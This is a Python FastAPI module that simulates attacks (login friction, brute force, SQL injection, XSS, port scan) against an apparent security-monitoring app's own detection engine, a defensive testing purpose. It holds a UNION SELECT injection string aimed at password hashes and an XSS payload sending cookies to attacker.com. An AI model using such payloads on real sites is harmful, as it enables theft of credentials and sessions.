import asyncio
import uuid
from datetime import datetime
from fastapi import APIRouter, Depends, HTTPException, Request
from sqlalchemy.orm import Session
from ..database import get_db
from ..models import User, SecurityEvent, SecurityIncident
from ..detection_engine import process_login_attempt, inspect_request_for_web_attacks, record_security_event
from ..ai_analyst import AISecurityAnalyst
import json

router = APIRouter(prefix="/api/v1/simulate", tags=["Attack & Behavior Simulator"])

@router.post("/human-login-friction")
async def simulate_human_friction(
    target_user: str = "john.doe",
    source_ip: str = "192.168.1.45",
    db: Session = Depends(get_db)
):
    """
    Simulates normal human user friction:
    Employee mistakenly types wrong password 3 times with realistic typing delay (seconds),
    followed by the 4th attempt being successful.
    Result: NO account lock, NO critical incident, classified as benign friction.
    """
    logs = []
    user = db.query(User).filter(User.username == target_user).first()
    if not user:
        raise HTTPException(status_code=404, detail=f"User {target_user} not found.")

    # Attempt 1, 2, 3: Failed attempts
    for i in range(1, 4):
        res = process_login_attempt(
            db=db,
            username=target_user,
            source_ip=source_ip,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0",
            success=False
        )
        logs.append({
            "step": f"Attempt {i}/4 (Mistyped password)",
            "timestamp": datetime.utcnow().strftime("%H:%M:%S.%f")[:-3],
            "result": res["status"],
            "locked": res.get("locked", False),
            "message": res["message"]
        })
        # Simulate slight delay
        await asyncio.sleep(0.3)

    # Attempt 4: Successful login
    success_res = process_login_attempt(
        db=db,
        username=target_user,
        source_ip=source_ip,
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0",
        success=True
    )
    logs.append({
        "step": "Attempt 4/4 (Correct password entered)",
        "timestamp": datetime.utcnow().strftime("%H:%M:%S.%f")[:-3],
        "result": "SUCCESS",
        "locked": False,
        "message": "Authentication successful! Normal human friction streak cleared."
    })

    return {
        "scenario": "Benign Human User Friction",
        "target_user": target_user,
        "source_ip": source_ip,
        "summary": "Employee mistyped password 3 times and succeeded on attempt 4. Zero incident raised, account remains completely active and unlocked.",
        "timeline": logs
    }

@router.post("/malware-brute-force")
async def simulate_malware_brute_force(
    target_user: str = "john.doe",
    source_ip: str = "10.0.88.214",
    db: Session = Depends(get_db)
):
    """
    Simulates automated high-velocity credential brute force attack / malware:
    6 rapid failed login attempts in sub-second intervals.
    Result: CRITICAL Incident triggered, account locked automatically, must_reset_password=True,
    AI report generated with MITRE T1110.001 mapping.
    """
    logs = []
    user = db.query(User).filter(User.username == target_user).first()
    if not user:
        raise HTTPException(status_code=404, detail=f"User {target_user} not found.")

    final_result = None

    for i in range(1, 7):
        res = process_login_attempt(
            db=db,
            username=target_user,
            source_ip=source_ip,
            user_agent="Hydra/9.5 (Kali Linux; automated-login-bot)",
            success=False
        )
        logs.append({
            "attempt": i,
            "timestamp": datetime.utcnow().strftime("%H:%M:%S.%f")[:-3],
            "status": res["status"],
            "locked": res.get("locked", False)
        })
        final_result = res
        await asyncio.sleep(0.05) # sub-second burst rate

    return {
        "scenario": "Automated High-Velocity Brute Force Attack",
        "target_user": target_user,
        "source_ip": source_ip,
        "classification": "CRITICAL SECURITY INCIDENT",
        "mitre_technique": "T1110.001 (Password Guessing)",
        "containment_action": "Account automatically quarantined. Employee must set new password (not matching last 3 passwords).",
        "incident_number": final_result.get("incident_number"),
        "burst_log": logs
    }

@router.post("/sqli")
async def simulate_sqli_attack(
    source_ip: str = "185.220.101.5",
    db: Session = Depends(get_db)
):
    payload = "admin' UNION SELECT id, password_hash, email FROM users WHERE '1'='1"
    res = inspect_request_for_web_attacks(
        db=db,
        source_ip=source_ip,
        user_agent="sqlmap/1.7.2#stable",
        query_params=f"q={payload}",
        body_content="",
        username="sqli-probe"
    )
    return {
        "scenario": "SQL Injection Exploit Attempt",
        "source_ip": source_ip,
        "payload": payload,
        "mitre_technique": "T1190",
        "result": res
    }

@router.post("/xss")
async def simulate_xss_attack(
    source_ip: str = "185.220.101.9",
    db: Session = Depends(get_db)
):
    payload = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
    res = inspect_request_for_web_attacks(
        db=db,
        source_ip=source_ip,
        user_agent="Mozilla/5.0 (X11; Linux x86_64)",
        query_params="",
        body_content=f"comment={payload}",
        username="xss-probe"
    )
    return {
        "scenario": "Cross-Site Scripting (XSS) Injection",
        "source_ip": source_ip,
        "payload": payload,
        "mitre_technique": "T1059.007",
        "result": res
    }

@router.post("/port-scan")
async def simulate_port_scan(
    source_ip: str = "45.154.255.88",
    db: Session = Depends(get_db)
):
    ports = [21, 22, 23, 80, 443, 3306, 5432, 8080]
    evidence = {
        "ports_scanned": ports,
        "scan_type": "TCP SYN Stealth Sweep",
        "rate": "150 packets/sec",
        "source_ip": source_ip
    }

    ai_report = AISecurityAnalyst.analyze_incident("PORT_SCAN", "network-gateway", source_ip, evidence)
    inc_num = f"INC-{datetime.utcnow().strftime('%Y%m%d')}-{uuid.uuid4().hex[:4].upper()}"

    incident = SecurityIncident(
        id=str(uuid.uuid4()),
        incident_number=inc_num,
        title=f"Network Port Reconnaissance from {source_ip}",
        attack_type="Port Scanning / Reconnaissance",
        severity="MEDIUM",
        status="OPEN",
        risk_score=78,
        mitre_technique="T1046",
        username="network-perimeter",
        source_ip=source_ip,
        evidence_data=json.dumps(evidence),
        ai_summary=json.dumps(ai_report)
    )
    db.add(incident)
    record_security_event(
        db=db,
        event_type="PORT_SCAN_DETECTED",
        username=None,
        source_ip=source_ip,
        user_agent="Nmap Scripting Engine (NSE)",
        severity="MEDIUM",
        details=evidence
    )
    db.commit()

    return {
        "scenario": "Network Port Scanning Reconnaissance",
        "source_ip": source_ip,
        "scanned_ports": ports,
        "mitre_technique": "T1046",
        "incident_number": inc_num
    }
